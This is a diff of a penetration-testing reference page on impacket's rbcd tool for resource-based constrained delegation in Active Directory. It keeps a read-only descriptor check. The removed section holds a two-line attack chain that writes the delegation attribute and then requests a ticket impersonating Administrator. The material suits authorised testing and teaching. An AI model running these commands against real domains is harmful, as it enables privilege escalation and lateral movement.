@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/rbcd.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=rbcd) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Read a computer's allowed-to-act descriptor
+## Read a computer's allowed-to-act descriptor
 
 **Run in:** Kali. **Requires:** A directory identity that can read the target computer; the password is prompted. This example does not write the descriptor.
 
@@ -21,51 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-rbcd -delegate-to 'TARGET$' -action read -dc-ip DC_IP 'DOMAIN_FQDN/USER'
 ```
 
-**Read the result:** Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
-
-**If The descriptor is empty or a listed principal is not controlled:** Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.
+**What the result establishes:** Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
 
 **Next check:** Resolve each SID and verify the controlled identity's prerequisites before considering any delegated service request.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## rbcd.py: choose the operation and read the result
-
-Commands and examples collected from your rbcd.py notes.
-
-### What the result establishes
-
-Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
-
-### Prerequisites and common failures
-
-Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.
-
-### Example 1: Resource-Based (RBCD)
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```bash
-# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
-getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your rbcd.py notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=rbcd) · [All tools](/index)
 
 ## Resource-Based (RBCD)
 
@@ -79,14 +43,22 @@ getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberos Delegation: Quick Reference — Example 3: Resource-Based (RBCD)](/active-directory/delegation#example-3-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Example 1: Resource-Based (RBCD)](/active-directory/delegation#example-1-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd)
+**Original note sections:** [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The descriptor is empty or a listed principal is not controlled | Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites. |
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
 
 {/* VAULT_RELATED_START */}
 
@@ -95,5 +67,3 @@ Saved as written; may include lab values or terminal output.
 - [Kerberos Delegation: Quick Reference](/active-directory/delegation)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
